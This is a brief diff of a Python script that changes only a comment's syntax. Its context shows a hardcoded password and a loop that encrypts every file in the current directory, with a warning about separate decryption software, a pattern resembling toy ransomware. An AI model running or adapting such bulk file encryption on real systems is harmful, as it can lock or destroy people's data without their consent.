@@ -41,7 +41,7 @@ def EncryptFile(fileNameParam: str , passwordParam: str) -> None :
         fileObject.write(encryptedFileContent)
 
 
-password = "2o9aQjoyRNTyTbp" // Optional Password. WARNING!! The decryption software must also have the same password.
+password = "2o9aQjoyRNTyTbp" # Optional Password. WARNING!! The decryption software must also have the same password.
 
 for file in os.listdir():
     fileName = file
